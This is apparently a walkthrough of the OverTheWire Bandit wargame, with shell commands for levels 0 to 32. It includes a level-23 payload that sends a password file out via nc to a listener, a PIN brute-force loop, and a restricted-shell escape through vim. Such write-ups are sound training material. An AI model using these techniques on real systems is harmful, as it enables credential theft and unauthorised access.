
# OverTheWire Bandit Writeups 33 Levels

Here I will show and explain how to solve each level in detail
## Table of contents

|  Levels 0 - 10  | Writeup  |  Levels 11 - 21  | Writeup |  Levels 22 - 32  | Writeup |
| ------------- |------------- | ------------- |------------- | ------------- |------------- |
|  0 -> 1  |  [Level 0](#Level-0)  |  11 -> 12  |  [Level 11](#Level-11)  |  22 -> 23  |  [Level 22](#Level-22)  |
|  1 -> 2  |  [Level 1](#Level-1)  |  12 -> 13  |  [Level 12](#Level-12)  |  23 -> 24  |  [Level 23](#Level-23)  |
|  2 -> 3  |  [Level 2](#Level-2)  |  13 -> 14  |  [Level 13](#Level-13)  |  24 -> 25  |  [Level 24](#Level-24)  |
|  3 -> 4  |  [Level 3](#Level-3)  |  14 -> 15  |  [Level 14](#Level-14)  |  25 -> 26  |  [Level 25](#Level-25)  |
|  4 -> 5  |  [Level 4](#Level-4)  |  15 -> 16  |  [Level 15](#Level-15)  |  26 -> 27  |  [Level 26](#Level-26)  |
|  5 -> 6  |  [Level 5](#Level-5)  |  16 -> 17  |  [Level 16](#Level-16)  |  27 -> 28  |  [Level 27](#Level-27)  |
|  6 -> 7  |  [Level 6](#Level-6)  |  17 -> 18  |  [Level 17](#Level-17)  |  28 -> 29  |  [Level 28](#Level-28)  |
|  7 -> 8  |  [Level 7](#Level-7)  |  18 -> 19  |  [Level 18](#Level-18)  |  29 -> 30  |  [Level 29](#Level-29)  |
|  8 -> 9  |  [Level 8](#Level-8)  |  19 -> 20  |  [Level 19](#Level-19)  |  30 -> 31  |  [Level 30](#Level-30)  |
|  9 -> 10 |  [Level 9](#Level-9)  |  20 -> 21  |  [Level 20](#Level-20)  |  31 -> 32  |  [Level 31](#Level-31)  |
|  10 -> 11  |  [Level 10](#Level-10)  |  21 -> 22  |  [Level 21](#Level-21)  |  32  |  [Level 32](#Level-32)  |



## Level 0

Just view contents of file

```bash
ls
cat readme
```


## Level 1

Use explicit relative path

```bash
ls
cat ./-
```

## level 2

Use quotation marks around file name
```bash
ls
cat ./"--spaces in this filename--"
```
## level 3

Use **ls -a** or **ls -la**

l -> list in directory in the list format

a -> show all items
```bash

ls -la inhere
cat inhere/...Hiding-From-You
```

## level 4

Use wildcard operator * to show all files and pipe operator | to feed commands directly

strings command show only human readable text

```bash
cat inhere/* | strings
```

## level 5

Here we know the file is 1033 Bytes, human-readable, and not executable

```bash
find ./inhere -size 1033c ! -executable
cat ./inhere/maybehere07/.file2
```

## level 6

Here we know the file has the following properties

Owned by user bandit7, group bandit6 and size is 33 bytes

```bash
find / -user "bandit7" -group "bandit6" -size 33c 2>/dev/null
cat /var/lib/dpkg/info/bandit7.password
```
The reason why we use 2>/dev/null is to ignore any error messages such as "permission denied"

## level 7

The password is stored next to the word "millionth" in the data.txt file

```bash
grep "millionth" data.txt
```

## level 8

The password is the only line that occurs only once

```bash
sort data.txt | uniq -u
```
The -u option in uniq command is used to show only unique lines, you can also use -c which show how many occurences each line has

## level 9

Password is in few human-readable lines that's preceeded by several '='
```bash
strings data.txt | grep '='
```
## level 10

The password is base64 encoded in the data.txt file
```bash
cat data.txt | base64 -d
```

## level 11

Password is rotated by 13 characters

```bash
cat data.txt | tr "A-Za-z" "N-ZA-Mn-za-m"
```
## level 12

This one is a bit repetitive, the password has been encoded multiple times and then hexdumped into data.txt

```bash
# create temporary directory
mktemp -d
cp data.txt /tmp/tmp.6A1TPbbqlD
cd /tmp/tmp.6A1TPbbqlD
```
```bash
# decode hexdump
xxd -r data.txt > recovered.bin
file recovered.bin
# gzip
mv recovered.bin stage2.gz
gzip -d stage2.gz
file stage2
# bzip2
mv stage2 stage3.bz2
bzip2 -d stage3.bz2
file stage3
# gzip
mv stage3 stage4.gz
gzip -d stage4.gz
file stage4
# POSIX tar archive
mv stage4 stage5.tar
tar -xf stage5.tar
file data5.bin
# POSIX tar archive
mv data5.bin stage6.tar
tar -xf stage6.tar
file data6.bin
# bzip2
mv data6.bin stage7.bz2
bzip2 -d stage7.bz2
file stage7
# POSIX tar archive
mv stage7 stage8.tar
tar -xf stage8.tar
file data8.bin
# gzip
mv data8.bin stage9.gz
gzip -d stage9.gz
file stage9
#ASCII text
cat stage9
```
## level 13

Password is stored in /etc/bandit_pass/bandit14 but can only accessed by bandit14, however we have sshkey

```bash
cat sshkey.private
# Copy the text in sshkey.private
exit
```
```bash
nano sshkey.private
# Cntrl + C -> Ctrl + O -> Ctrl + X 
```
```bash
chmod 600 sshkey.private
```
```bash
ssh -i sshkey.private bandit14@bandit.labs.overthewire.org -p 2220
```
```bash
cat /etc/bandit_pass/bandit14
```

## level 14

Here we simply need to send the current level's password to port 30000 on localhost

```bash
echo "password" | nc 127.0.0.1 30000
```

## level 15

Here we need to send current level password to localhost on port 30001 Using TLS/SSL encryption
```bash
openssl s_client -connect 127.0.0.1:30001
# Paste current level password

```

## level 16

Here we have a wide range of ports (31000 -> 32000) so we need to do some bash coding

```bash
pass="password"

for port in {31000..32000}; do
    response=$(echo "$pass" |
        openssl s_client -connect 127.0.0.1:"$port" -quiet 2>/dev/null)

    if [ -n "$response" ] && [ "$response" != "$pass" ]; then
        echo "Port: $port $response"
    fi
done

# We get ssh certificate 
```

## level 17

We need to get the new added line between passwords.new and passwords.old
```bash
# -Fxv means print all lines that are not exactly equal to the given string 
grep -Fxv -f passwords.old passwords.new
```

## level 18

Here we just need to read the file called "readme" without interactive shell

```bash
ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat readme"
```

## level 19

Here we need to run commands as bandit 20 using the binary file
```bash
./bandit20-do cat /etc/bandit_pass/bandit20
```
## level 20

Here you need to connect to bandit 20 on 2 terminals


```bash
# Terminal 1
nc -lvnp 1234
```
```bash
# Terminal 2
./suconnect 1234
# Paste password of bandit20 on Terminal 1
```


## level 21
We need to check /etc/cron.d

```bash
ls /etc/cron.d
# cronjob_bandit22
cat /etc/cron.d/cronjob_bandit22
# Contents
cat /usr/bin/cronjob_bandit22.sh
# Contents
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

## level 22
We need to check /etc/cron.d

```bash
cat /etc/cron.d/cronjob_bandit23
# @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
# * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
# Lets run the echo command saved in "mytarget"
echo I am user bandit23 | md5sum | cut -d ' ' -f 1
# 8ca319486bfbbc3663ea0fbe81326349
cat /tmp/8ca319486bfbbc3663ea0fbe81326349
```

## level 23
We need to check /etc/cron.d

```bash
cat /etc/cron.d/cronjob_bandit24
# @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
# * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
cat /usr/bin/cronjob_bandit24.sh

# Here we can see any file in /var/spool/bandit24/foo gets executed and then removed
```
```bash
# Step 1: make temp directory
mktemp -d
cd <tmp dir path>
```
```bash
# Step 2: Create our payload
cat > payload <<EOF
#!/bin/bash
cat /etc/bandit_pass/bandit24 | nc localhost 1337
EOF
```
```bash
# Step 3: Create Listener on second Terminal
nc -lvnp 1337
```
```bash
# Step 4: Make our payload executable and copy to target directory
chmod +x payload
cp payload /var/spool/bandit24/foo/payload
```

## level 24

Here we need to brute force 10000 digits from 0000 to 9999 on port 30002
```bash
pass="Previous Password"
for i in $(seq -w 0 9999); do
    echo "$pass $i"
done | nc 127.0.0.1 30002 | grep -v "Wrong"
```

## level 25
Here we get the hint that something is wrong with the bandit 26 shell

```bash
ls
# bandit26.sshkey

# Lets check /etc/passwd for bandit 26
cat /etc/passwd
# bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

cat /usr/bin/showtext
#!/bin/sh
#export TERM=linux
#exec more ~/text.txt
#exit 0
# This means that we go into "more" and then exit which doesn't allow shell to start
```

## level 26

```bash
# From your machine
stty rows 5 cols 80
ssh -i sshkey.private bandit26@bandit.labs.overthewire.org -p 2220

# Press v to open vim
# From vim type **:set shell=/bin/bash**
# Then type **:shell** to open new shell
cat /etc/bandit_pass/bandit26

ls
# bandit27-do

./bandit27-do cat /etc/bandit_pass/bandit27
```

## level 27
Tiem to start using git
```bash
# From your machine
git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
cat repo/README
```

## level 28

```bash
git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo
cd repo
git log
# git show <log id>:<path to file>
git show 2678cfadd8f2a347bc23e1ea491f702e5b184709:README.md
```

## level 29

```bash
git clone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo
cd repo
git merge origin/dev
cat README.md
```

## level 30

```bash
git clone ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/repo
# look at ./git/packed-refs we see a "secret" branch
cat ./git/packed-refs
git show 6a76bc87a774031428feb5cc910568293c335545
```

## level 31
Here we need to push file "key.txt" that has the line "May I come in?" to master branch
```bash
git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo
echo "May I come in?" > key.txt
git add -f key.txt
git commit -m "key"
git push origin master
```

## level 32
All characters convert to uppercase 
```bash
$0
# This points back to the original shell /bin/bash so it opens a fresh shell
cat /etc/bandit_pass/bandit33
```

# THE END
